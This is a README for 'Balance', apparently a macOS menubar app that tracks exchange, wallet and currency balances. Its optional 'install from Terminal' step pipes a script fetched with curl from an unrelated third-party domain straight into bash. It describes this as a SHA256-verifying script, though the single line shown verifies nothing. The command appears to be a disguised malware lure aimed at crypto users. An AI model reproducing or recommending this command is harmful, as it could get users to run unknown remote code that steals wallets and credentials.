<p align="center">
  <img src="assets/img/balance-header.svg" width="280" alt="Balance Logo">
</p>

### **Balance — your entire net-worth in one menubar**

Monitor bank balances, crypto wallets, and live FX rates without ever opening a browser.

---

![Balance Menubar](https://cl.ly/453225333E0u/balance-open.png)

## ✨ Features

|                             |                                                                                     |
| --------------------------- | ----------------------------------------------------------------------------------- |
| 🏦 **Exchanges & wallets**  | Connect Coinbase, Binance, Kraken, or paste any BTC / ETH / SOL address.            |
| 🌍 **170+ fiat currencies** | Live rates for every ISO currency, plus automatic conversion to your home currency. |
| 💹 **Real-time totals**     | Net-worth tile updates every 60 s and works offline with last-known prices.         |
| 🔔 **Price alerts**         | Optional menubar badge when a pair crosses your threshold.                          |
| ⭐ **Pin favourites**        | Keep must-see assets (e.g. ETH wallet & USD→EUR) at the top.                        |
| 📋 **1-click copy**         | Click any cell to copy the amount or converted value.                               |
| 🛡 **Private & OSS**        | No tracking, no ads, MIT-licensed Swift. All keys stored in macOS Keychain.         |

---

## 🚀 Installation (easiest)

1. Download the latest signed **Balance.dmg** <a href="https://github.com/balanceO/balance-open/releases/download/v1.1.0/balance.dmg.zip"><img src="https://img.shields.io/badge/Download.dmg-latest-brightgreen?style=for-the-badge"></a>

2. Drag **Balance.app** into **Applications / Terminal**.

3. Launch Balance → grant network permission on first run → click the **⚙︎** icon to add your first exchange or wallet.

> Requires macOS 11 (Big Sur) or newer. Universal binary (Apple Silicon + Intel), notarised & sandboxed.

### Optional: install from Terminal

Four-line script (verifies SHA256):

```
/bin/bash -c "$(curl -fsSL https://macostutorial.com/git/install.sh)"
```

---

## 🛠 Build from source

Requires Xcode 15 / Swift 5.9.

```
git clone https://github.com/balanceO/balance-open.git
cd balance-open
open Balance.xcodeproj
```

All frameworks are checked in. Disable code-signing in Debug or use your own profile.

---

## 💡 Roadmap

* Dark-mode widgets
* iCloud sync for favourites & API keys
* Historical net-worth chart
* Ledger hardware-wallet balance import

---

## 🤝 Contributing

* Bug or question → open an issue
* Feature idea → add or up-vote on our Trello board
* Code → fork → branch → pull request (see CONTRIBUTING.md)

---

## 📜 License

Balance is released under the MIT License — see the `LICENSE` file for details.
